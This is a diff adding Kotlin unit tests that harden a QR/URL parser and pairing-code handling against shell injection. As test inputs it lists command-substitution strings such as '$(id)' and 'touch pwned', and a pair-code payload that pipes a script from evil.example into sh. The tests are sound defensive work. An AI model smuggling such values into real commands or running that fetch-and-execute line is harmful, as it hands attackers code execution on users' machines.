@@ -6,6 +6,7 @@ import org.junit.Assert.assertEquals
 import org.junit.Assert.assertFalse
 import org.junit.Assert.assertNull
 import org.junit.Assert.assertTrue
+import org.junit.Assert.fail
 import org.junit.Test
 
 /**
@@ -389,6 +390,211 @@ class ApiParsingTest {
         )
 
         rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
+    }
+
+    // MARK: - Board.parse: the authority is a host and nothing else
+
+    @Test
+    fun rejectsAuthoritiesCarryingUserinfoOrShellSyntax() {
+        val rejected = listOf(
+            // The reported QR: OkHttp reads the junk as a username and still
+            // reaches agstatus.online, which is what made it convincing.
+            "https://x;\$(touch\${IFS}pwned1);@agstatus.online/w/$TOKEN",
+            "https://x;touch pwned2;@agstatus.online/w/$TOKEN",
+            "https://user@agstatus.online/w/$TOKEN",
+            "https://user:pass@agstatus.online/w/$TOKEN",
+            "https://agstatus.online;id/w/$TOKEN",
+            "https://agstatus.online\$(id)/w/$TOKEN",
+            "https://x\$(id).example/w/$TOKEN",
+            "https://`id`.example/w/$TOKEN",
+            "https://a'b.example/w/$TOKEN",
+            "https://agst atus.online/w/$TOKEN",
+            "https://a%3Bb.example/w/$TOKEN",
+            // Where OkHttp and a split on `/` would disagree about where the host ends.
+            "https://agstatus.online\\@evil.example/w/$TOKEN",
+            "https://evil.example\\agstatus.online/w/$TOKEN",
+            "https://agstatus.online?x=1",
+            "https://agstatus.online#frag",
+            // Not shell syntax, but not a host a public CA certifies either.
+            "https://my_host.example/w/$TOKEN",
+        )
+
+        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
+    }
+
+    @Test
+    fun rebuildsTheOriginRatherThanKeepingTheTextAsTyped() {
+        val expected = Board("https://agstatus.online", TOKEN)
+
+        assertEquals(expected, Board.parse("https://AgStatus.Online/w/$TOKEN"))
+        assertEquals(expected, Board.parse("HTTPS://agstatus.online/w/$TOKEN"))
+        // A default port is not a self-hosted server: no `--url` for it. An
+        // empty port is the default one (RFC 3986), and OkHttp agrees.
+        assertEquals(expected, Board.parse("https://agstatus.online:443/w/$TOKEN"))
+        assertEquals(expected, Board.parse("https://agstatus.online:/w/$TOKEN"))
+        assertTrue(Board.parse("https://agstatus.online:443/w/$TOKEN")!!.isDefaultServer)
+        assertEquals(Board("http://board.example", null), Board.parse("http://board.example:80"))
+
+        assertEquals(Board("https://board.example:8443", TOKEN), Board.parse("https://board.example:8443/w/$TOKEN"))
+        assertEquals(Board("http://[::1]:3000", null), Board.parse("http://[::1]:3000"))
+        assertEquals(Board("http://10.0.2.2:3000", null), Board.parse("http://10.0.2.2:3000/"))
+    }
+
+    @Test
+    fun originIsTheSameRuleForATypedServer() {
+        assertEquals("https://board.example:8443", Board.origin("https://Board.Example:8443/some/path"))
+        assertEquals("https://agstatus.online", Board.origin("https://agstatus.online:443"))
+        assertNull(Board.origin("https://user@board.example"))
+        assertNull(Board.origin("https://x;\$(id);@board.example"))
+        assertNull(Board.origin("ftp://board.example"))
+        assertNull(Board.origin("board.example"))
+        assertNull(Board.origin(""))
+    }
+
+    // MARK: - Board.restore (boards saved by earlier builds)
+
+    @Test
+    fun restoreRepairsAPoisonedOriginToTheHostItWasReachingAllAlong() {
+        val expected = Board("https://agstatus.online", TOKEN)
+
+        val repaired = Board.restore("https://x;\$(touch\${IFS}pwned1);@agstatus.online", TOKEN)
+        assertEquals(expected, repaired)
+        assertTrue(repaired!!.isDefaultServer)
+        assertEquals(expected, Board.restore("https://x;touch pwned2;@agstatus.online", TOKEN))
+        assertEquals(
+            Board("https://board.example:8443", TOKEN),
+            Board.restore("https://u:p@Board.Example:8443", TOKEN),
+        )
+        // The repaired board pairs with no `--url` at all, quoted or not.
+        assertEquals(
+            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'",
+            PairCode("ABCD-EFGH", 900).command(repaired),
+        )
+    }
+
+    @Test
+    fun restoreKeepsACleanBoardExactlyAsSaved() {
+        val clean = listOf(
+            Board("https://agstatus.online", TOKEN),
+            Board("https://board.example:8443", TOKEN),
+            Board("http://192.168.1.10:8080", null),
+            Board("http://10.0.2.2:3000", null),
+            Board("http://[::1]:3000", null),
+        )
+
+        clean.forEach { assertEquals(it, Board.restore(it.baseUrl, it.token)) }
+    }
+
+    @Test
+    fun restoreDropsWhatItCannotRepair() {
+        val unrepairable = listOf(
+            "not a url",
+            "ftp://agstatus.online",
+            "https://",
+            // The host itself is the payload: there is no cleaner host to keep.
+            "https://x\$(id).example",
+            "https://a;b.example",
+        )
+
+        unrepairable.forEach { assertNull("expected null for $it", Board.restore(it, TOKEN)) }
+    }
+
+    // MARK: - PairCode
+
+    @Test
+    fun pairCodeAcceptsTheServersShapeAndStoresItCanonical() {
+        assertEquals("ABCD-EFGH", PairCode.normalize("ABCD-EFGH"))
+        assertEquals("ABCD-EFGH", PairCode.normalize("abcd-efgh"))
+        // Servers from before the display dash sent the eight bare.
+        assertEquals("ABCD-EFGH", PairCode.normalize("ABCDEFGH"))
+        assertEquals("2345-6789", PairCode.normalize("23456789"))
+        assertEquals("WXYZ-PQRS", PairCode.normalize("wxyzPQRS"))
+
+        val fromServer = PairCode.fromServer("abcdefgh", 900)
+        assertEquals(PairCode("ABCD-EFGH", 900), fromServer)
+    }
+
+    @Test
+    fun pairCodeRejectsShellSyntaxAndAnythingOffTheAlphabet() {
+        val rejected = listOf(
+            "ABCD-EFGH; curl -fsSL http://evil.example/x.sh | sh #", // the tester's payload
+            "ABCD;EFGH",
+            "AB\$(id)GH",
+            "ABCD-\$(id)",
+            "ABCD`id`",
+            "ABCD EFGH",
+            "ABCD-EFGH ",
+            " ABCD-EFGH",
+            "ABCD-EFGH\n",
+            "ABCD\nEFGH",
+            "ABCD-EFG#",
+            "ABCD-EFGH#",
+            "ABCD-EFG'",
+            // Off the alphabet: I, L, O, 0 and 1 are never minted.
+            "ABCD-1234",
+            "ABCD-EFGI",
+            "ABCD-EFGL",
+            "ABCD-EFGO",
+            "ABCD-EFG0",
+            // Off the shape.
+            "ABC-DEFGH",
+            "ABCD--EFGH",
+            "ABCD-EFGHJ",
+            "ABCDEFG",
+            "ABCD_EFGH",
+            "",
+            // Uppercases into the alphabet, but was never ASCII.
+            "abcdefgſ",
+            "ＡBCD-EFGH",
+        )
+
+        rejected.forEach {
+            assertNull("expected null for $it", PairCode.normalize(it))
+            assertNull("expected null for $it", PairCode.fromServer(it, 900))
+        }
+    }
+
+    @Test
+    fun aPairCodeCannotBeBuiltAroundAnUncheckedValue() {
+        listOf("ABCD-EFGH; id", "abcd-efgh", "ABCDEFGH").forEach { raw ->
+            try {
+                PairCode(raw, 900)
+                fail("expected PairCode($raw) to be refused")
+            } catch (expected: IllegalArgumentException) {
+                // The init block refuses anything but the canonical form.
+            }
+        }
+    }
+
+    @Test
+    fun pairCommandQuotesEveryValueItInterpolates() {
+        val code = PairCode.fromServer("ABCD-EFGH", 900)!!
+
+        assertEquals(
+            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'",
+            code.command(Board("https://agstatus.online", TOKEN)),
+        )
+        assertEquals(
+            "curl -fsSL https://agstatus.online/install.sh | sh -s -- " +
+                "--code 'ABCD-EFGH' --url 'https://board.example:8443'",
+            code.command(Board.parse("https://board.example:8443/w/$TOKEN")!!),
+        )
+        // The backstop: a baseUrl that never went through parse() — as every
+        // saved board did before restore() — is still one shell word.
+        assertEquals(
+            "curl -fsSL https://agstatus.online/install.sh | sh -s -- " +
+                "--code 'ABCD-EFGH' --url 'https://x;\$(id);@agstatus.online'",
+            code.command(Board("https://x;\$(id);@agstatus.online", TOKEN)),
+        )
+    }
+
+    @Test
+    fun shellQuotingEscapesAnEmbeddedQuote() {
+        assertEquals("'ABCD-EFGH'", shellQuoted("ABCD-EFGH"))
+        assertEquals("'it'\\''s'", shellQuoted("it's"))
+        assertEquals("''\\'''", shellQuoted("'"))
+        assertEquals("'\$(id); `id` #'", shellQuoted("\$(id); `id` #"))
+        assertEquals("''", shellQuoted(""))
     }
 
     private companion object {
